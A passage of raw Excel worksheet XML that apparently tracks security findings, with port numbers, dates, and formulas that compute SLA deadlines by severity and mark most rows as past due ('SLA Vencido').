      <c r="I54" s="4"/>
      <c r="J54" s="4" t="s">
        <v>276</v>
      </c>
      <c r="K54" s="4" t="s">
        <v>277</v>
      </c>
      <c r="L54" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M54" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N54" s="4"/>
      <c r="O54" s="6"/>
      <c r="P54" s="6" t="s">
        <v>250</v>
      </c>
      <c r="Q54" s="6"/>
      <c r="R54" s="4">
        <v>443</v>
      </c>
      <c r="S54" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T54" s="8">
        <v>43812</v>
      </c>
      <c r="U54" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V54" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W54" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X54" s="11"/>
      <c r="Y54" s="11"/>
      <c r="Z54" s="11"/>
      <c r="AA54" s="8">
        <v>43969</v>
      </c>
      <c r="AB54" s="9" t="s">
        <v>278</v>
      </c>
      <c r="AC54" s="9" t="s">
        <v>279</v>
      </c>
      <c r="AD54" s="36"/>
      <c r="AE54" s="4"/>
      <c r="AF54" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG54" s="27"/>
    </row>
    <row r="55" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A55" s="5">
        <v>54</v>
      </c>
      <c r="B55" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C55" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D55" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E55" s="4"/>
      <c r="F55" s="4"/>
      <c r="G55" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H55" s="4"/>
      <c r="I55" s="4"/>
      <c r="J55" s="4" t="s">
        <v>280</v>
      </c>
      <c r="K55" s="4" t="s">
        <v>281</v>
      </c>
      <c r="L55" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M55" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N55" s="4"/>
      <c r="O55" s="6"/>
      <c r="P55" s="6" t="s">
        <v>282</v>
      </c>
      <c r="Q55" s="6"/>
      <c r="R55" s="4">
        <v>264</v>
      </c>
      <c r="S55" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T55" s="8">
        <v>43812</v>
      </c>
      <c r="U55" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V55" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W55" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X55" s="11"/>
      <c r="Y55" s="11"/>
      <c r="Z55" s="11"/>
      <c r="AA55" s="8">
        <v>43969</v>
      </c>
      <c r="AB55" s="9" t="s">
        <v>283</v>
      </c>
      <c r="AC55" s="9" t="s">
        <v>284</v>
      </c>
      <c r="AD55" s="36"/>
      <c r="AE55" s="4"/>
      <c r="AF55" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG55" s="27"/>
    </row>
    <row r="56" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A56" s="5">
        <v>55</v>
      </c>
      <c r="B56" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C56" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D56" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E56" s="4"/>
      <c r="F56" s="4"/>
      <c r="G56" s="4" t="s">
        <v>252</v>
      </c>
      <c r="H56" s="4"/>
      <c r="I56" s="4"/>
      <c r="J56" s="4" t="s">
        <v>280</v>
      </c>
      <c r="K56" s="4" t="s">
        <v>281</v>
      </c>
      <c r="L56" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M56" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N56" s="4"/>
      <c r="O56" s="6"/>
      <c r="P56" s="6" t="s">
        <v>253</v>
      </c>
      <c r="Q56" s="6"/>
      <c r="R56" s="4">
        <v>264</v>
      </c>
      <c r="S56" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T56" s="8">
        <v>43812</v>
      </c>
      <c r="U56" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V56" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W56" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X56" s="11"/>
      <c r="Y56" s="11"/>
      <c r="Z56" s="11"/>
      <c r="AA56" s="8">
        <v>44069</v>
      </c>
      <c r="AB56" s="9" t="s">
        <v>285</v>
      </c>
      <c r="AC56" s="9" t="s">
        <v>284</v>
      </c>
      <c r="AD56" s="36"/>
      <c r="AE56" s="4"/>
      <c r="AF56" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG56" s="27"/>
    </row>
    <row r="57" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A57" s="5">
        <v>56</v>
      </c>
      <c r="B57" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C57" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D57" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E57" s="4"/>
      <c r="F57" s="4"/>
      <c r="G57" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H57" s="4"/>
      <c r="I57" s="4"/>
      <c r="J57" s="4" t="s">
        <v>280</v>
      </c>
      <c r="K57" s="4" t="s">
        <v>281</v>
      </c>
      <c r="L57" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M57" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N57" s="4"/>
      <c r="O57" s="6"/>
      <c r="P57" s="6" t="s">
        <v>286</v>
      </c>
      <c r="Q57" s="6"/>
      <c r="R57" s="4">
        <v>264</v>
      </c>
      <c r="S57" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T57" s="8">
        <v>43812</v>
      </c>
      <c r="U57" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V57" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W57" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X57" s="11"/>
      <c r="Y57" s="11"/>
      <c r="Z57" s="11"/>
      <c r="AA57" s="8">
        <v>43969</v>
      </c>
      <c r="AB57" s="9" t="s">
        <v>287</v>
      </c>
      <c r="AC57" s="9" t="s">
        <v>284</v>
      </c>
      <c r="AD57" s="36"/>
      <c r="AE57" s="4"/>
      <c r="AF57" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG57" s="27"/>
    </row>
    <row r="58" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A58" s="5">
        <v>57</v>
      </c>
      <c r="B58" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C58" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D58" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E58" s="4"/>
      <c r="F58" s="4"/>
      <c r="G58" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H58" s="4"/>
      <c r="I58" s="4"/>
      <c r="J58" s="4" t="s">
        <v>288</v>
      </c>
      <c r="K58" s="4" t="s">
        <v>289</v>
      </c>
      <c r="L58" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M58" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N58" s="4"/>
      <c r="O58" s="6"/>
      <c r="P58" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q58" s="6"/>
      <c r="R58" s="4">
        <v>500</v>
      </c>
      <c r="S58" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T58" s="8">
        <v>43812</v>
      </c>
      <c r="U58" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V58" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W58" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X58" s="11"/>
      <c r="Y58" s="11"/>
      <c r="Z58" s="11"/>
      <c r="AA58" s="8"/>
      <c r="AB58" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC58" s="9" t="s">
        <v>291</v>
      </c>
      <c r="AD58" s="36"/>
      <c r="AE58" s="4"/>
      <c r="AF58" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG58" s="27"/>
    </row>
    <row r="59" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A59" s="5">
        <v>58</v>
      </c>
      <c r="B59" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C59" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D59" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E59" s="4"/>
      <c r="F59" s="4"/>
      <c r="G59" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H59" s="4"/>
      <c r="I59" s="4"/>
      <c r="J59" s="4" t="s">
        <v>288</v>
      </c>
      <c r="K59" s="4" t="s">
        <v>289</v>
      </c>
      <c r="L59" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M59" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N59" s="4"/>
      <c r="O59" s="6"/>
      <c r="P59" s="6" t="s">
        <v>264</v>
      </c>
      <c r="Q59" s="6"/>
      <c r="R59" s="4">
        <v>500</v>
      </c>
      <c r="S59" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T59" s="8">
        <v>43812</v>
      </c>
      <c r="U59" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V59" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W59" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X59" s="11"/>
      <c r="Y59" s="11"/>
      <c r="Z59" s="11"/>
      <c r="AA59" s="8">
        <v>43969</v>
      </c>
      <c r="AB59" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC59" s="9" t="s">
        <v>291</v>
      </c>
      <c r="AD59" s="36"/>
      <c r="AE59" s="4"/>
      <c r="AF59" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG59" s="27"/>
    </row>
    <row r="60" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A60" s="5">
        <v>59</v>
      </c>
      <c r="B60" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C60" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D60" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E60" s="4"/>
      <c r="F60" s="4"/>
      <c r="G60" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H60" s="4"/>
      <c r="I60" s="4"/>
      <c r="J60" s="4" t="s">
        <v>288</v>
      </c>
      <c r="K60" s="4" t="s">
        <v>289</v>
      </c>
      <c r="L60" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M60" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N60" s="4"/>
      <c r="O60" s="6"/>
      <c r="P60" s="6" t="s">
        <v>268</v>
      </c>
      <c r="Q60" s="6"/>
      <c r="R60" s="4">
        <v>500</v>
      </c>
      <c r="S60" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T60" s="8">
        <v>43812</v>
      </c>
      <c r="U60" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V60" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W60" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X60" s="11"/>
      <c r="Y60" s="11"/>
      <c r="Z60" s="11"/>
      <c r="AA60" s="8">
        <v>43969</v>
      </c>
      <c r="AB60" s="9" t="s">
        <v>292</v>
      </c>
      <c r="AC60" s="9" t="s">
        <v>291</v>
      </c>
      <c r="AD60" s="36"/>
      <c r="AE60" s="4"/>
      <c r="AF60" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG60" s="27"/>
    </row>
    <row r="61" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A61" s="5">
        <v>60</v>
      </c>
      <c r="B61" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C61" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D61" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E61" s="4"/>
      <c r="F61" s="4"/>
      <c r="G61" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H61" s="4"/>
      <c r="I61" s="4"/>
      <c r="J61" s="4" t="s">
        <v>288</v>
      </c>
      <c r="K61" s="4" t="s">
        <v>289</v>
      </c>
      <c r="L61" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M61" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N61" s="4"/>
      <c r="O61" s="6"/>
      <c r="P61" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q61" s="6"/>
      <c r="R61" s="4">
        <v>500</v>
      </c>
      <c r="S61" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T61" s="8">
        <v>43812</v>
      </c>
      <c r="U61" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V61" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W61" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X61" s="11"/>
      <c r="Y61" s="11"/>
      <c r="Z61" s="11"/>
      <c r="AA61" s="8"/>
      <c r="AB61" s="9" t="s">
        <v>292</v>
      </c>
      <c r="AC61" s="9" t="s">
        <v>291</v>
      </c>
      <c r="AD61" s="36"/>
      <c r="AE61" s="4"/>
      <c r="AF61" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG61" s="27"/>
    </row>
    <row r="62" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A62" s="5">
        <v>61</v>
      </c>
      <c r="B62" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C62" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D62" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E62" s="4"/>
      <c r="F62" s="4"/>
      <c r="G62" s="4" t="s">
        <v>252</v>
      </c>
      <c r="H62" s="4"/>
      <c r="I62" s="4"/>
      <c r="J62" s="4" t="s">
        <v>293</v>
      </c>
      <c r="K62" s="4" t="s">
        <v>294</v>
      </c>
      <c r="L62" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M62" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N62" s="4"/>
      <c r="O62" s="6"/>
      <c r="P62" s="6" t="s">
        <v>253</v>
      </c>
      <c r="Q62" s="6"/>
      <c r="R62" s="4">
        <v>443</v>
      </c>
      <c r="S62" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T62" s="8">
        <v>43812</v>
      </c>
      <c r="U62" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V62" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W62" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X62" s="11"/>
      <c r="Y62" s="11"/>
      <c r="Z62" s="11"/>
      <c r="AA62" s="8">
        <v>43969</v>
      </c>
      <c r="AB62" s="9" t="s">
        <v>295</v>
      </c>
      <c r="AC62" s="9" t="s">
        <v>296</v>
      </c>
      <c r="AD62" s="36"/>
      <c r="AE62" s="4"/>
      <c r="AF62" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG62" s="27"/>
    </row>
    <row r="63" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A63" s="5">
        <v>62</v>
      </c>
      <c r="B63" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C63" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D63" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E63" s="4"/>
      <c r="F63" s="4"/>
      <c r="G63" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H63" s="4"/>
      <c r="I63" s="4"/>
      <c r="J63" s="4" t="s">
        <v>297</v>
      </c>
      <c r="K63" s="4" t="s">
        <v>294</v>
      </c>
      <c r="L63" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M63" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N63" s="4"/>
      <c r="O63" s="6"/>
      <c r="P63" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q63" s="6"/>
      <c r="R63" s="4">
        <v>500</v>
      </c>
      <c r="S63" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T63" s="8">
        <v>43812</v>
      </c>
      <c r="U63" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V63" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W63" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X63" s="11"/>
      <c r="Y63" s="11"/>
      <c r="Z63" s="11"/>
      <c r="AA63" s="8"/>
      <c r="AB63" s="9" t="s">
        <v>298</v>
      </c>
      <c r="AC63" s="9" t="s">
        <v>299</v>
      </c>
      <c r="AD63" s="36"/>
      <c r="AE63" s="4"/>
      <c r="AF63" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG63" s="27"/>
    </row>
    <row r="64" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A64" s="5">
        <v>63</v>
      </c>
      <c r="B64" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C64" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D64" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E64" s="4"/>
      <c r="F64" s="4"/>
      <c r="G64" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H64" s="4"/>
      <c r="I64" s="4"/>
      <c r="J64" s="4" t="s">
        <v>297</v>
      </c>
      <c r="K64" s="4" t="s">
        <v>294</v>
      </c>
      <c r="L64" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M64" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N64" s="4"/>
      <c r="O64" s="6"/>
      <c r="P64" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q64" s="6"/>
      <c r="R64" s="4">
        <v>500</v>
      </c>
      <c r="S64" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T64" s="8">
        <v>43812</v>
      </c>
      <c r="U64" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V64" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W64" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X64" s="11"/>
      <c r="Y64" s="11"/>
      <c r="Z64" s="11"/>
      <c r="AA64" s="8"/>
      <c r="AB64" s="9" t="s">
        <v>300</v>
      </c>
      <c r="AC64" s="9" t="s">
        <v>299</v>
      </c>
      <c r="AD64" s="36"/>
      <c r="AE64" s="4"/>
      <c r="AF64" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG64" s="27"/>
    </row>
    <row r="65" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A65" s="5">
        <v>64</v>
      </c>
      <c r="B65" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C65" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D65" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E65" s="4"/>
      <c r="F65" s="4"/>
      <c r="G65" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H65" s="4"/>
      <c r="I65" s="4"/>
      <c r="J65" s="4" t="s">
        <v>297</v>
      </c>
      <c r="K65" s="4" t="s">
        <v>294</v>
      </c>
      <c r="L65" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M65" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N65" s="4"/>
      <c r="O65" s="6"/>
      <c r="P65" s="6" t="s">
        <v>268</v>
      </c>
      <c r="Q65" s="6"/>
      <c r="R65" s="4">
        <v>500</v>
      </c>
      <c r="S65" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T65" s="8">
        <v>43812</v>
      </c>
      <c r="U65" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V65" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W65" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X65" s="11"/>
      <c r="Y65" s="11"/>
      <c r="Z65" s="11"/>
      <c r="AA65" s="8">
        <v>43969</v>
      </c>
      <c r="AB65" s="9" t="s">
        <v>301</v>
      </c>
      <c r="AC65" s="9" t="s">
        <v>299</v>
      </c>
      <c r="AD65" s="36"/>
      <c r="AE65" s="4"/>
      <c r="AF65" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG65" s="27"/>
    </row>
    <row r="66" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A66" s="5">
        <v>65</v>
      </c>
      <c r="B66" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C66" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D66" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E66" s="4"/>
      <c r="F66" s="4"/>
      <c r="G66" s="4" t="s">
        <v>263</v>
      </c>
      <c r="H66" s="4"/>
      <c r="I66" s="4"/>
      <c r="J66" s="4" t="s">
        <v>297</v>
      </c>
      <c r="K66" s="4" t="s">
        <v>294</v>
      </c>
      <c r="L66" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M66" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N66" s="4"/>
      <c r="O66" s="6"/>
      <c r="P66" s="6" t="s">
        <v>264</v>
      </c>
      <c r="Q66" s="6"/>
      <c r="R66" s="4">
        <v>500</v>
      </c>
      <c r="S66" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T66" s="8">
        <v>43812</v>
      </c>
      <c r="U66" s="11">
        <f t="shared" ref="U66:U129" ca="1" si="3">TODAY()-T66</f>
        <v>2397</v>
      </c>
      <c r="V66" s="8">
        <f t="shared" ref="V66:V129" si="4">IF(M66="Critical",T66+10,IF(M66="High",T66+30,IF(M66="Bad",T66+30,IF(M66="Medium",T66+90,IF(M66="Warm",T66+90,IF(M66="Low",T66+120,IF(M66="Fair",T66+120,IF(M66="Neutral",T66+120,""))))))))</f>
        <v>43902</v>
      </c>
      <c r="W66" s="12" t="str">
        <f t="shared" ref="W66:W129" ca="1" si="5">IF(M66="Critical",IF(U66&gt;10,"SLA Vencido","En SLA"),IF(M66="High",IF(U66&gt;30,"SLA Vencido","En SLA"),IF(M66="Bad",IF(U66&gt;30,"SLA Vencido","En SLA"),IF(M66="Medium",IF(U66&gt;90,"SLA Vencido","En SLA"),IF(M66="Warm",IF(U66&gt;90,"SLA Vencido","En SLA"),IF(M66="Low",IF(U66&gt;120,"SLA Vencido","En SLA"),IF(M66="Fair",IF(U66&gt;120,"SLA Vencido","En SLA"),IF(M66="Neutral",IF(U66&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X66" s="11"/>
      <c r="Y66" s="11"/>
      <c r="Z66" s="11"/>
      <c r="AA66" s="8">
        <v>43969</v>
      </c>
      <c r="AB66" s="9" t="s">
        <v>302</v>
      </c>
      <c r="AC66" s="9" t="s">
        <v>299</v>
      </c>
      <c r="AD66" s="36"/>
      <c r="AE66" s="4"/>
      <c r="AF66" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG66" s="27"/>
    </row>
    <row r="67" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A67" s="5">
        <v>66</v>
      </c>
      <c r="B67" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C67" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D67" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E67" s="4"/>
      <c r="F67" s="4"/>
      <c r="G67" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H67" s="4"/>
      <c r="I67" s="4"/>
      <c r="J67" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K67" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L67" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M67" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N67" s="4"/>
      <c r="O67" s="6"/>
      <c r="P67" s="6" t="s">
        <v>305</v>
      </c>
      <c r="Q67" s="6"/>
      <c r="R67" s="4">
        <v>500</v>
      </c>
      <c r="S67" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T67" s="8">
        <v>43812</v>
      </c>
      <c r="U67" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V67" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W67" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X67" s="11"/>
      <c r="Y67" s="11"/>
      <c r="Z67" s="11"/>
      <c r="AA67" s="8">
        <v>43969</v>
      </c>
      <c r="AB67" s="9"/>
      <c r="AC67" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD67" s="36"/>
      <c r="AE67" s="4"/>
      <c r="AF67" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG67" s="27"/>
    </row>
    <row r="68" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A68" s="5">
        <v>67</v>
      </c>
      <c r="B68" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C68" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D68" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E68" s="4"/>
      <c r="F68" s="4"/>
      <c r="G68" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H68" s="4"/>
      <c r="I68" s="4"/>
      <c r="J68" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K68" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L68" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M68" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N68" s="4"/>
      <c r="O68" s="6"/>
      <c r="P68" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q68" s="6"/>
      <c r="R68" s="4">
        <v>500</v>
      </c>
      <c r="S68" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T68" s="8">
        <v>43812</v>
      </c>
      <c r="U68" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V68" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W68" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X68" s="11"/>
      <c r="Y68" s="11"/>
      <c r="Z68" s="11"/>
      <c r="AA68" s="8"/>
      <c r="AB68" s="9" t="s">
        <v>290</v>
      </c>
      <c r="AC68" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD68" s="36"/>
      <c r="AE68" s="4"/>
      <c r="AF68" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG68" s="27"/>
    </row>
    <row r="69" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A69" s="5">
        <v>68</v>
      </c>
      <c r="B69" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C69" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D69" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E69" s="4"/>
      <c r="F69" s="4"/>
      <c r="G69" s="4" t="s">
        <v>272</v>
      </c>
      <c r="H69" s="4"/>
      <c r="I69" s="4"/>
      <c r="J69" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K69" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L69" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M69" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N69" s="4"/>
      <c r="O69" s="6"/>
      <c r="P69" s="6" t="s">
        <v>286</v>
      </c>
      <c r="Q69" s="6"/>
      <c r="R69" s="4">
        <v>500</v>
      </c>
      <c r="S69" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T69" s="8">
        <v>43812</v>
      </c>
      <c r="U69" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V69" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W69" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X69" s="11"/>
      <c r="Y69" s="11"/>
      <c r="Z69" s="11"/>
      <c r="AA69" s="8">
        <v>43969</v>
      </c>
      <c r="AB69" s="9"/>
      <c r="AC69" s="9" t="s">
        <v>306</v>
      </c>
      <c r="AD69" s="36"/>
      <c r="AE69" s="4"/>
      <c r="AF69" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG69" s="27"/>
    </row>
    <row r="70" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A70" s="5">
        <v>69</v>
      </c>
      <c r="B70" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C70" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D70" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E70" s="4"/>
      <c r="F70" s="4"/>
      <c r="G70" s="4" t="s">
        <v>255</v>
      </c>
      <c r="H70" s="4"/>
      <c r="I70" s="4"/>
      <c r="J70" s="4" t="s">
        <v>303</v>
      </c>
      <c r="K70" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L70" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M70" s="5" t="s">
        <v>111</v>
